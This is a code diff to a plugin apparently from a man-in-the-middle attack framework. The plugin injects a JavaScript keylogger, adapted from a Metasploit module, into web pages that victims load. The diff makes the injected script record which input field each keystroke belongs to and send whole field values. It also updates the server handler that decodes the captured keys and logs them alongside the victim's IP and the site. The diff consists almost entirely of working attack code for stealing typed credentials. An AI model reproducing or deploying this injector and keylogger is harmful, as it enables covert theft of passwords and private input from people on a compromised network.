@@ -2,7 +2,6 @@ from plugins.plugin import Plugin
 from plugins.Inject import Inject
 import logging
 
-
 class jskeylogger(Inject, Plugin):
     name = "Javascript Keylogger"
     optname = "jskeylogger"
@@ -13,13 +12,18 @@ class jskeylogger(Inject, Plugin):
     def initialize(self, options):
         Inject.initialize(self, options)
         self.html_payload = self.msf_keylogger()
+
         print "[*] Javascript Keylogger plugin online"
 
     def sendPostData(self, request):
         #Handle the plugin output
         if 'keylog' in request.uri:
-            keys = request.postData.split(",")
+
+            raw_keys = request.postData.split("&&")[0]
+            keys = raw_keys.split(",")
             del keys[0]; del(keys[len(keys)-1])
+
+            input_field = request.postData.split("&&")[1]            
 
             nice = ''
             for n in keys:
@@ -33,9 +37,14 @@ class jskeylogger(Inject, Plugin):
                     try:
                         nice += n.decode('hex')
                     except:
-                        logging.warning("%s ERROR decoding char %s" % (request.client.getClientIP(), n))
+                        logging.warning("%s ERROR decoding char: %s" % (request.client.getClientIP(), n))
 
-            logging.warning("%s [%s] Keys: %s" % (request.client.getClientIP(), request.headers['host'], nice))
+            #try:
+            #     input_field = input_field.decode('hex')
+            #except:
+            #    logging.warning("%s ERROR decoding input field name: %s" % (request.client.getClientIP(), input_field))
+            
+            logging.warning("%s [%s] Field: %s Keys: %s" % (request.client.getClientIP(), request.headers['host'], input_field, nice))
 
     def msf_keylogger(self):
         #Stolen from the Metasploit module http_javascript_keylogger
@@ -43,7 +52,7 @@ class jskeylogger(Inject, Plugin):
         payload = """<script type="text/javascript">
 window.onload = function mainfunc(){
 var2 = ",";
-
+name = '';
 function make_xhr(){
     var xhr;
             try {
@@ -80,29 +89,58 @@ document.onkeydown = function1;
 }
 
 }
-function function2(e){
-var3 = (window.event) ? window.event.keyCode : e.which;
-var3 = var3.toString(16);
-if (var3 != "d"){
-function3(var3);
-}
-}
-function function1(e){
-var3 = (window.event) ? window.event.keyCode : e.which;
-if (var3 == 9 || var3 == 8 || var3 == 13){
-function3(var3);
-}
+
+function function2(e)
+{
+    srcname = window.event.srcElement.name;
+    var3 = (window.event) ? window.event.keyCode : e.which;
+    var3 = var3.toString(16);
+    
+    if (var3 != "d")
+    {
+        andxhr(var3, srcname);
+    }
 }
 
-function function3(var3){
-var2 = var2 + var3 + ",";
+function function1(e)
+{
+    srcname = window.event.srcElement.name;
+    id = window.event.srcElement.id;
 
-xhr.open("POST", "keylog", true);
-xhr.setRequestHeader("Content-type","application/x-www-form-urlencoded");
-xhr.send(var2);
+    var3 = (window.event) ? window.event.keyCode : e.which;
+    if (var3 == 9 || var3 == 8 || var3 == 13)
+    {
+        andxhr(var3, srcname);
+    }
+    else if (var3 == 0)
+    {
+        
+        text = document.getElementById(id).value;
+        if (text.length != 0)
+        {   
+            andxhr(text.toString(16), srcname);
+        }
+    } 
+}
 
-if (var3 == 13 || var2.length > 3000)
-    var2 = ",";
+function andxhr(key, inputName)
+{   
+    if (inputName != name)
+    {
+        name = inputName;
+        var2 = ",";
+    }
+
+    var2= var2 + key + ",";
+
+    xhr.open("POST", "keylog", true);
+    xhr.setRequestHeader("Content-type","application/x-www-form-urlencoded");
+    xhr.send(var2 + '&&' + inputName);
+    
+    if (key == 13 || var2.length > 3000)
+    {
+        var2 = ",";
+    }
 }
 </script>"""
 
